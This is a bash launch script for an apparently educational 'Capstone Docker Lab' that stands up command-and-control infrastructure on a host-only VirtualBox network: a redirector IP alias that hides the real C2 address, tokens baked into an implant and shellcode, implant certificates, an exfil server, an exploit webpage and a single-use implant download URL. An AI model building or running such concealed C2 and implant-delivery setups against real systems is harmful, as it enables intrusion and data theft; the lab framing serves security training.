#!/bin/bash

# ─────────────────────────────────────────────
#  Capstone Docker Lab — Launch Script
# ─────────────────────────────────────────────

set -eo pipefail
# Note: use || true on commands that are allowed to fail (e.g. docker compose down with nothing running)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="$SCRIPT_DIR/.env"
COMPOSE_FILE="$SCRIPT_DIR/docker-compose.yml"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo ""
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}       Capstone Docker Lab — Launch Script      ${NC}"
echo -e "${CYAN}================================================${NC}"
echo ""

# ── 1. Check dependencies ─────────────────────
echo -e "${YELLOW}[*] Checking dependencies...${NC}"

if ! command -v docker &>/dev/null; then
    echo -e "${RED}[!] Docker is not installed. Install it and try again.${NC}"
    exit 1
fi

if ! docker compose version &>/dev/null; then
    echo -e "${RED}[!] Docker Compose plugin not found. Install it and try again.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Docker and Docker Compose found.${NC}"

# ── 2. Detect available host IPs ─────────────
echo ""
echo -e "${YELLOW}[*] Detecting network interfaces...${NC}"
echo ""
echo -e "    ${YELLOW}NOTE: Your Windows VM must use a Host-Only adapter in VirtualBox.${NC}"
echo -e "    The ${GREEN}vboxnet0${NC} IP is your real C2 machine IP."
echo -e "    You will be prompted for a separate REDIRECTOR IP (an alias on the same interface)."
echo -e "    The victim connects to the redirector IP only — your real IP stays hidden."
echo ""

# Use a more portable way to list interfaces and IPs
mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.')

HOSTONLY_IP=""
HOSTONLY_IFACE=""
if [ ${#IFACES[@]} -eq 0 ]; then
    echo -e "${RED}[!] No non-loopback IPv4 interfaces found.${NC}"
else
    echo "    Available IPs:"
    for iface in "${IFACES[@]}"; do
        IFACE_NAME=$(echo "$iface" | awk '{print $1}')
        IFACE_IP=$(echo "$iface" | awk '{print $2}' | cut -d'/' -f1)
        if [[ "$IFACE_NAME" == vboxnet* || "$IFACE_NAME" == vmnet* ]]; then
            echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP  ${CYAN}← your C2 machine (host-only)${NC}"
            HOSTONLY_IP="$IFACE_IP"
            HOSTONLY_IFACE="$IFACE_NAME"
        else
            echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP"
        fi
    done
fi

# Auto-suggest a redirector IP: increment the last octet by 9
# e.g. 192.168.56.1 → 192.168.56.10
if [ -n "$HOSTONLY_IP" ]; then
    _BASE=$(echo "$HOSTONLY_IP" | cut -d'.' -f1-3)
    _LAST=$(echo "$HOSTONLY_IP" | cut -d'.' -f4)
    SUGGESTED_REDIRECTOR_IP="${_BASE}.$(((_LAST + 9) % 255))"
fi

# ── 3. Prompt for redirector IP ───────────────
echo ""
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${YELLOW}[*] No .env file found — creating one now.${NC}"
fi

CURRENT_IP=$(grep -oP '(?<=C2_HOST_IP=)\S+' "$ENV_FILE" 2>/dev/null || echo "")

echo ""
echo -e "    ${CYAN}The REDIRECTOR IP is the address baked into the implant.${NC}"
echo -e "    ${CYAN}It will be added as an IP alias on ${HOSTONLY_IFACE:-vboxnet0} so Docker can bind to it.${NC}"
echo -e "    ${CYAN}Victim traffic hits this IP — your real C2 IP (${HOSTONLY_IP}) stays hidden.${NC}"
echo ""

if [ -n "$CURRENT_IP" ]; then
    echo -e "${YELLOW}[*] Current redirector IP in .env: ${GREEN}$CURRENT_IP${NC}"
    read -rp "    Enter new redirector IP (or press Enter to keep '$CURRENT_IP'): " INPUT_IP
    HOST_IP="${INPUT_IP:-$CURRENT_IP}"
elif [ -n "$SUGGESTED_REDIRECTOR_IP" ]; then
    echo -e "${YELLOW}[*] Your C2 machine IP: ${GREEN}${HOSTONLY_IP}${NC}"
    echo -e "${YELLOW}[*] Suggested redirector IP: ${GREEN}${SUGGESTED_REDIRECTOR_IP}${NC}"
    read -rp "    Press Enter to use '${SUGGESTED_REDIRECTOR_IP}' or enter a different IP: " INPUT_IP
    HOST_IP="${INPUT_IP:-$SUGGESTED_REDIRECTOR_IP}"
else
    read -rp "    Enter redirector IP to use (e.g. 192.168.56.10): " HOST_IP
fi

# Validate IP format
if ! echo "$HOST_IP" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
    echo -e "${RED}[!] Invalid IP address: '$HOST_IP'. Exiting.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Using redirector IP (C2_HOST_IP): ${HOST_IP}${NC}"

# ── 3a. Add IP alias so Docker can bind the redirector port to HOST_IP ──
# If HOST_IP differs from the host-only adapter's primary IP, add it as an
# alias on the same interface.  This makes the redirector appear as a
# distinct IP on the network — the victim never sees the real C2 machine IP.
if [ -n "$HOSTONLY_IFACE" ] && [ "$HOST_IP" != "$HOSTONLY_IP" ]; then
    echo ""
    echo -e "${YELLOW}[*] Adding IP alias ${HOST_IP} on ${HOSTONLY_IFACE}...${NC}"
    if sudo ip addr add "${HOST_IP}/24" dev "$HOSTONLY_IFACE" 2>/dev/null; then
        echo -e "${GREEN}[+] IP alias added — victim will connect to ${HOST_IP}, not ${HOSTONLY_IP}.${NC}"
    else
        echo -e "${CYAN}[~] Alias already exists or could not be added (continuing).${NC}"
    fi
fi

# ── 3b. Generate tokens (BP2 enrollment + BP3 download) ───────────
echo ""
echo -e "${YELLOW}[*] Generating tokens (BP2 enrollment + BP3 download)...${NC}"

# DOWNLOAD_TOKEN is always refreshed — each run serves a new implant binary.
DOWNLOAD_TOKEN=$(openssl rand -hex 32)

# ENROLLMENT_TOKEN is preserved when the CA is reused so that already-installed
# implants (which have the old token baked in) can still re-enroll after a
# c2-server rebuild.  Generate a new one only when no token exists yet
# (i.e. the very first launch.sh run, or after a deliberate CA rotation).
EXISTING_ENROLLMENT=$(grep -oP '(?<=ENROLLMENT_TOKEN=)\S+' "$ENV_FILE" 2>/dev/null || echo "")
CA_EXISTS=$( [ -f "$SCRIPT_DIR/certs/ca.key" ] && [ -f "$SCRIPT_DIR/certs/ca.crt" ] && echo "yes" || echo "no" )

if [ "$CA_EXISTS" = "yes" ] && [ -n "$EXISTING_ENROLLMENT" ]; then
    ENROLLMENT_TOKEN="$EXISTING_ENROLLMENT"
    echo -e "${GREEN}[+] DOWNLOAD_TOKEN generated (new); ENROLLMENT_TOKEN preserved (CA reused)${NC}"
else
    ENROLLMENT_TOKEN=$(openssl rand -hex 16)
    echo -e "${GREEN}[+] DOWNLOAD_TOKEN and ENROLLMENT_TOKEN generated (new PKI epoch)${NC}"
fi

# Write to .env
cat > "$ENV_FILE" <<EOF
# Redirector IP — baked into implant.exe and bound to the redirector container.
# This is an IP alias on the host-only interface, distinct from the real C2 machine IP.
# Regenerated by launch.sh on $(date)
C2_HOST_IP=${HOST_IP}

# Single-use download token (Section 9 / BP3). Embedded in shellcode.
DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}

# Single-use enrollment token (BP2). Baked into implant.exe at build time.
# The controller validates this token when the implant presents its CSR.
# Preserved across restarts when the CA is reused — rotate by deleting
# certs/ca.key + certs/ca.crt before running launch.sh.
ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
EOF

echo -e "${GREEN}[+] .env written.${NC}"

# ── 3c. Generate PKI (CA, controller, implant 30-day, nginx) ──────
echo ""
echo -e "${YELLOW}[*] Generating PKI — CA, controller cert, implant cert (30-day), nginx cert...${NC}"
CERT_SCRIPT="$SCRIPT_DIR/certs/generate_certs.sh"
if [ ! -f "$CERT_SCRIPT" ]; then
    echo -e "${RED}[!] certs/generate_certs.sh not found.${NC}"
    exit 1
fi
if ! bash "$CERT_SCRIPT" "$HOST_IP" 2>&1 | sed 's/^/    /'; then
    echo -e "${RED}[!] PKI generation failed.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] PKI generated (implant cert expires in 30 days — BP4).${NC}"

# ── 4. Stop any existing lab containers ───────
echo ""
echo -e "${YELLOW}[*] Stopping any existing lab containers...${NC}"
docker compose -f "$COMPOSE_FILE" down 2>/dev/null || true
echo -e "${GREEN}[+] Ready to rebuild.${NC}"

# ── 5. Check for port conflicts ───────────────
echo ""
echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888)...${NC}"
echo -e "    ${CYAN}(Port 443 is now owned by the redirector container — c2-server has no direct host port)${NC}"

CONFLICT=0
for PORT in 443 8443 8888; do
    if ss -tlnp 2>/dev/null | grep -q ":${PORT} "; then
        echo -e "${RED}[!] Port $PORT is already in use.${NC}"
        CONFLICT=1
    fi
done

if [ $CONFLICT -eq 1 ]; then
    read -rp "    Port conflicts detected. Continue anyway? (y/N): " CONFIRM
    CONFIRM="${CONFIRM:-N}"
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] Exiting. Free up the conflicting ports and try again.${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}[+] No port conflicts.${NC}"
fi

# ── 7. Build and launch ───────────────────────
echo ""
echo -e "${YELLOW}[*] Building and launching containers (this may take a few minutes)...${NC}"
echo ""

docker compose -f "$COMPOSE_FILE" up --build -d

# ── 8. Verify containers are running ─────────
echo ""
echo -e "${YELLOW}[*] Verifying containers started...${NC}"
sleep 3

ALL_UP=1
for NAME in redirector c2-server exfil-server; do
    STATUS=$(docker inspect --format='{{.State.Status}}' "$NAME" 2>/dev/null || echo "missing")
    if [ "$STATUS" = "running" ]; then
        echo -e "    ${GREEN}[+] $NAME is running${NC}"
    else
        echo -e "    ${RED}[!] $NAME is NOT running (status: $STATUS)${NC}"
        ALL_UP=0
    fi
done

# ── 9. Summary ────────────────────────────────
echo ""
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}                    Summary                     ${NC}"
echo -e "${CYAN}================================================${NC}"
echo ""
echo -e "  IP separation:"
echo -e "    Real C2 machine  → ${CYAN}${HOSTONLY_IP}${NC}  (your Linux host — victim never sees this)"
echo -e "    Redirector IP    → ${GREEN}${HOST_IP}${NC}  (alias on ${HOSTONLY_IFACE:-vboxnet0} — baked into implant)"
echo ""
echo -e "  Traffic path (C2):  victim → ${GREEN}${HOST_IP}:443${NC} (redirector) → ${GREEN}c2-server:443${NC} (backnet only)"
echo -e "  Exploit webpage  → ${GREEN}http://localhost:8888${NC}"
echo -e "  Implant delivery → ${GREEN}https://localhost:8443/update/<token>${NC}  (HTTPS, single-use)"
echo ""
echo -e "  From Windows VM:"
echo -e "  Exploit webpage  → ${GREEN}http://${HOST_IP}:8888${NC}"
echo -e "  Download implant → ${GREEN}https://${HOST_IP}:8443/update/${DOWNLOAD_TOKEN}${NC}  (in shellcode)"
echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (redirector alias — not the real C2 IP)"
echo -e "  Real C2 server   → ${CYAN}backnet only — unreachable from victim network${NC}"
echo ""
echo -e "  Attach to C2 controller:"
echo -e "    ${CYAN}sudo docker attach c2-server${NC}"
echo -e "  Detach without stopping: ${CYAN}Ctrl+P then Ctrl+Q${NC}"
echo ""

if [ $ALL_UP -eq 1 ]; then
    echo -e "${GREEN}[+] Lab is up and ready.${NC}"
else
    echo -e "${RED}[!] One or more containers failed to start. Check logs:${NC}"
    echo -e "    ${CYAN}docker compose logs -f${NC}"
fi

echo ""
